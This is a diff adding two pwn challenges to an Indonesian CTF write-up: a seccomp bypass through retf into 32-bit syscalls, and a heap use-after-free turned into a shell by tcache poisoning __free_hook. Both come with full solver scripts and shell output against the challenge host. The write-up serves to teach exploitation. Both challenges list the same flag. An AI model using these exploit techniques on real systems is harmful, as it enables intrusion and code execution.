@@ -176,7 +176,7 @@ flag{e4fd4c9fcad9ba84666e5c7a4a9ab1f0}
 
 Libc diberikan, berarti perlu *leak-meleak* disini.
 
-### main_func
+### Main Function
 
 Hanya singkat, write dan read.
 
@@ -191,7 +191,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 }
 ```
 
-### information leak.
+### Information Leak
 
 Ini binary 64bit. Parameter fungsi secara berurutan terletak di rdi, rsi, rdx, rcx, r8, r9, selebihnya di-*stack*.
 
@@ -340,7 +340,7 @@ $ python -c 'print "a"*0x28' | ./weird_cookie
 00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
 00000020  61 61 61 61 61 61 61 61  0a b1 18 6d 87 29 34 12  |aaaaaaaa...m.)4.|
-00000030  90 52 55 55 55 55                                 |.RUUUU|
+00000030  90 52 55 55 55 55                                  |.RUUUU|
 [snip]
 ```
 
@@ -418,4 +418,408 @@ flag{e87923d7cd36a8580d0cf78656d457c6}
 
 ### Flag
 
-flag{e87923d7cd36a8580d0cf78656d457c6}
+`flag{e87923d7cd36a8580d0cf78656d457c6}`
+
+
+## Sanded Box [500pts]
+
+I set up a secure environment for users to execute shellcode. Now nobody will be able to get the flag!
+
+
+### run_sandbox
+
+seccomp dump:
+
+```
+   line  CODE  JT   JF      K
+   =================================
+   0000: 0x20 0x00 0x00 0x00000004  A = arch
+   0001: 0x20 0x00 0x00 0x00000000  A = sys_number
+   0002: 0x25 0x0c 0x00 0x3fffffff  if (A > 0x3fffffff) goto 0015
+   0003: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0015
+   0004: 0x15 0x0a 0x00 0x00000002  if (A == open) goto 0015
+   0005: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0015
+   0006: 0x15 0x08 0x00 0x00000039  if (A == fork) goto 0015
+   0007: 0x15 0x07 0x00 0x0000003a  if (A == vfork) goto 0015
+   0008: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0015
+   0009: 0x15 0x05 0x00 0x00000055  if (A == creat) goto 0015
+   0010: 0x15 0x04 0x00 0x00000101  if (A == openat) goto 0015
+   0011: 0x15 0x03 0x00 0x00000142  if (A == execveat) goto 0015
+   0012: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0015
+   0013: 0x15 0x01 0x00 0x00000011  if (A == pread64) goto 0015
+   0014: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0016
+   0015: 0x06 0x00 0x00 0x00000000  return KILL
+   0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+Tidak bisa inject shellcode execve, execveat, karena di blacklist. open-read-write juga diblacklist. Syscall ABI? tidak bisa karena diblacklist.
+
+Solusi? yeah. `retf intruction`.
+
+Intruksi ini akan pop 2 value, yaitu di *cs* dan *ip*. Jika value *cs* ini 0x23, maka program akan return ke "32 bit mode". Kalau cs init 0x33, program return ke "64 bit mode".
+
+Nah ini cukup mem-*bypass* filter diatas. Karena *syscall_number* di 32 bit itu beda sama 64 bit. Tapi execve tidak bisa dilakukan, karena ter-blacklist juga.
+
+```c
+#!/usr/bin/python
+
+from pwn import *
+
+context.arch = 'amd64'
+
+shellcode = '''
+   sub rbp, 0xff8
+   mov rsp, rbp
+   add rsp, 0x10
+   push 0x23
+   sub rsp, 0x4
+   add rdi, 0x1d
+   add [rsp], rdi
+   retf
+   
+   push 0x74
+   push 0x78742e67
+   push 0x616c662f
+   mov eax, 5
+   mov ebx, esp
+   xor ecx, ecx
+   xor edx, edx
+   int 0x80
+
+   mov ebx, eax
+   mov ecx, esp
+   mov edx, 0x50
+   mov eax, 3
+   int 0x80
+   
+   mov eax, 4
+   mov ebx, 1
+   mov ecx, esp
+   mov edx, 0x50
+   int 0x80
+'''
+
+def upload_file(raw):
+    u = 'http://challenge.ctf.games:32039/upload.php'
+    a = {'fileToUpload' : ['solver.bin', raw]}
+    b = {'submit' : 'Upload File'}
+    c = requests.post(u, files=a, data=b)
+    return c.text
+
+import requests
+import re
+
+shellcode = asm(shellcode)
+response  = upload_file(shellcode)
+flag = re.search("flag{.*}", response).group()
+
+print flag
+
+```
+
+Didalam *Dockerfile* didapatkan letak flag yaitu di "/flag.txt". Tinggal *open-read-write* file "/flag.txt". Udah.
+
+
+### Flag
+
+`flag{dc75c408f5ba2fbc72b307987dddc775}`
+
+
+## WAF [500pts]
+
+Not to be confused with Web Application Firewall. (Only one team solve this chall, lol)
+
+### Structure
+
+Kira-kira, struktur data-nya *begini*,
+
+```c
+struct Config {
+   int id;
+   char *setting;
+   char is_active;
+}
+```
+
+### Add Config
+
+Difungsi ini, hanya input id, size, lalu setting config diallokasikan menggunakan *malloc*.
+
+```c
+__int64 __fastcall add_config(__int64 a1)
+{
+  const char *v1; // rbx@1
+  char v3; // [sp+1Bh] [bp-35h]@1
+  int n; // [sp+1Ch] [bp-34h]@1
+  char s; // [sp+20h] [bp-30h]@1
+  __int64 v6; // [sp+38h] [bp-18h]@1
+
+  v6 = *MK_FP(__FS__, 40LL);
+  printf("What is the id of the config?: ");
+  fgets(&s, 16, stdin);
+  *(_DWORD *)a1 = atoi(&s);
+  memset(&s, 0, 0x10uLL);
+  printf("What is the size of the setting?: ", 0LL);
+  fgets(&s, 16, stdin);
+  n = atoi(&s);
+  *(_QWORD *)(a1 + 8) = malloc(n);
+  printf("What is the setting to be added?: ", 16LL);
+  fgets(*(char **)(a1 + 8), n, stdin);
+  v1 = *(const char **)(a1 + 8);
+  v1[strcspn(v1, "\r\n")] = 0;
+  printf("Should this setting be active? [y/n]: ", "\r\n");
+  __isoc99_scanf(" %c", &v3);
+  getchar();
+  *(_BYTE *)(a1 + 16) = v3 == 121;
+  puts("\nConfig added.\n");
+  return v6 - *MK_FP(__FS__, 40LL);
+}
+```
+
+### Edit Config
+
+Realloc data yang sudah diallokasikan, berdasarkan index config.
+
+```c
+__int64 __fastcall edit_config(__int64 a1, int a2)
+{
+  int *v2; // rbx@1
+  __int64 v3; // rbx@1
+  __int64 v4; // rsi@1
+  const char *v5; // rbx@1
+  int v7; // [sp+4h] [bp-4Ch]@1
+  char v8; // [sp+1Bh] [bp-35h]@1
+  int n; // [sp+1Ch] [bp-34h]@1
+  char s; // [sp+20h] [bp-30h]@1
+  __int64 v11; // [sp+38h] [bp-18h]@1
+
+  v7 = a2;
+  v11 = *MK_FP(__FS__, 40LL);
+  printf("What is the new ID?: ");
+  fgets(&s, 16, stdin);
+  v2 = *(8LL * a2 + a1);
+  *v2 = atoi(&s);
+  memset(&s, 0, 0x10uLL);
+  printf("What is the new size of the setting?: ", 0LL);
+  fgets(&s, 16, stdin);
+  n = atoi(&s);
+  v3 = *(8LL * a2 + a1);
+  v4 = n;
+  *(v3 + 8) = realloc(*(*(8LL * v7 + a1) + 8LL), n);
+  printf("What is the new setting?: ", v4);
+  fgets(*(*(8LL * v7 + a1) + 8LL), n, stdin);
+  v5 = *(*(8LL * v7 + a1) + 8LL);
+  v5[strcspn(v5, "\r\n")] = 0;
+  printf("Should this be active? [y/n]: ", "\r\n");
+  __isoc99_scanf(" %c", &v8);
+  getchar();
+  *(*(8LL * v7 + a1) + 16LL) = v8 == 121;
+  putchar(10);
+  puts("Config Edited.");
+  return v11 - *MK_FP(__FS__, 40LL);
+}
+```
+
+### Print Config
+
+Hanya melakukan printing data-data config yang sudah dialokasikan.
+
+```c
+int __fastcall print_config(__int64 a1, int a2)
+{
+  putchar(10);
+  printf("ID: %d\n", **(8LL * a2 + a1));
+  printf("Setting: %s\n", *(*(8LL * a2 + a1) + 8LL));
+  printf("Is active: %d\n", *(*(8LL * a2 + a1) + 16LL));
+  return putchar(10);
+}
+```
+
+### Remove Last
+
+Melakukan *free* terhadap data yang terakhir kali dialokasikan.
+
+
+### Bug
+
+Ya, bug-nya terdapat di edit dan print. Disana tidak ada pengecekan bahwa data sudah di free atau belum. Ini menimbulkan *use-after-free*. Tapi *use-after-free* disini terhadap index yang terakhir di-free.
+
+```
+$ ./waf 
+Web Application Firewall Configuration.
+
+1. Add new configuration.
+2. Edit configuration.
+3. Print configuration.
+4. Remove last added configuration.
+5. Print all configurations.
+6. Exit
+
+> 1
+What is the id of the config?: 0
+What is the size of the setting?: 40
+What is the setting to be added?: AAAAAAAA
+Should this setting be active? [y/n]: n
+
+Config added.
+
+1. Add new configuration.
+2. Edit configuration.
+3. Print configuration.
+4. Remove last added configuration.
+5. Print all configurations.
+6. Exit
+
+> 1
+What is the id of the config?: 1
+What is the size of the setting?: 40
+What is the setting to be added?: BBBBBBBB
+Should this setting be active? [y/n]: n
+
+Config added.
+
+1. Add new configuration.
+2. Edit configuration.
+3. Print configuration.
+4. Remove last added configuration.
+5. Print all configurations.
+6. Exit
+
+> 4
+Last config removed.
+
+1. Add new configuration.
+2. Edit configuration.
+3. Print configuration.
+4. Remove last added configuration.
+5. Print all configurations.
+6. Exit
+
+> 4
+Last config removed.
+
+1. Add new configuration.
+2. Edit configuration.
+3. Print configuration.
+4. Remove last added configuration.
+5. Print all configurations.
+6. Exit
+
+> 3
+What is the index of the config to print?: 0
+
+ID: 4215472    <- LEAK
+Setting:     <- LEAK
+Is active: 0
+```
+
+### Information Leak.
+
+Leak bisa didapatkan dengan memenuhi *tcache-bin*. Yaitu dengan alloc 7 chunks, lalu free semuanya. Nah chunk terakhir ini akan berisi sisa-sisa pointer *unsorted-bin* yang berisi alamat *main_arena*. Nah karena *main_arena* itu letaknya di-libc, maka dengan *use-after-free* yaitu dengan print index ini akan mendapatkan libc leak!
+
+Setelah itu, tinggal *tcache poisoning*. Overwrite `__free_hook` dengan `system`. Free chunk yang menyimpan string "/bin/sh" untuk mendapatkan RCE.
+
+Full solver,
+
+```python
+#!/usr/bin/python
+
+from pwn import *
+
+ELF_PATH = './waf'
+
+elf  = ELF(ELF_PATH, 0)
+libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so', 0)
+
+gdbscript = ''''''
+
+def debug(gdbscript):
+    if type(r) == process:
+        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])
+
+def add(id, size, data, isactive="y"):
+    r.sendlineafter('> ', '1')
+    r.sendlineafter(': ', str(id))
+    r.sendlineafter(': ', str(size))
+    r.sendlineafter(': ', str(data))
+    r.sendlineafter(': ', isactive)
+
+def edit(idx, id, size, data, isactive="y"):
+    r.sendlineafter('> ', '2')
+    r.sendlineafter(': ', str(idx))
+    r.sendlineafter(': ', str(id))
+    r.sendlineafter(': ', str(size))
+    r.sendlineafter(': ', str(data))
+    r.sendlineafter(': ', isactive)
+
+def view(idx):
+    r.sendlineafter('> ', '3')
+    r.sendlineafter(': ', str(idx))
+    r.recvline(0)
+    arr = []
+    for _ in range(3):
+        arr.append(r.recvline(0).split(": ")[1])
+    return arr
+
+def delete_last():
+    r.sendlineafter('> ', '4')
+
+def exploit(r):
+    for i in range(8):
+        add(i, 0x80, "a"*8)
+
+    for i in range(8):
+        delete_last()
+
+    leak = u64(view(0)[1].ljust(8, '\0'))
+    libc.address = leak - 4111520
+
+    info("leak 0x%x", leak)
+    info("libc 0x%x", libc.address)
+    
+    # just for clean bins. actually just need 1 freed chunk -> edit (uaf)
+    for i in range(8):
+        add(i, 0x80, "a"*8)
+
+    delete_last() # 7
+
+    edit(7, 1337, 0x80, p64(libc.sym['__free_hook']+1)*2)
+    add(8, 0xc0, "d"*64) # need this
+    add(9, 0xc0, p64(libc.sym['system']))
+    add(10, 0x8, "/bin/sh")
+
+    delete_last() # trigger system
+
+    r.interactive()
+
+if __name__ == '__main__':
+    if len(sys.argv) > 1:
+        r = remote("challenge.ctf.games", sys.argv[1])
+    else:
+        r = process(ELF_PATH, aslr=0)
+    exploit(r)
+```
+
+This chall, only 1 team solve this lol. Yeah its me lol.
+
+```py
+[+] Opening connection to challenge.ctf.games on port 31213: Done
+[*] leak 0x7f6fb0456ca0
+[*] libc 0x7f6fb006b000
+[*] Switching to interactive mode
+$ ls -l
+total 48
+drwxr-xr-x 1 root 0  4096 Dec 28 17:47 bin
+drwxr-xr-x 1 root 0  4096 Dec 28 17:47 dev
+drwxr-xr-x 1 root 0  4096 Dec 28 17:47 etc
+-r--r--r-- 1 root 0    39 Dec 28 17:46 flag.txt
+drwxr-xr-x 1 root 0  4096 Dec 28 17:47 lib
+drwxr-xr-x 1 root 0  4096 Dec 28 17:47 lib64
+drwxr-xr-x 1 root 0  4096 Dec 28 17:47 usr
+---x--x--x 1 root 0 17344 Dec 28 17:46 waf
+$ cat flag.txt
+flag{dc75c408f5ba2fbc72b307987dddc775}
+$ 
+[*] Interrupted
+[*] Closed connection to challenge.ctf.games port 31213
+```
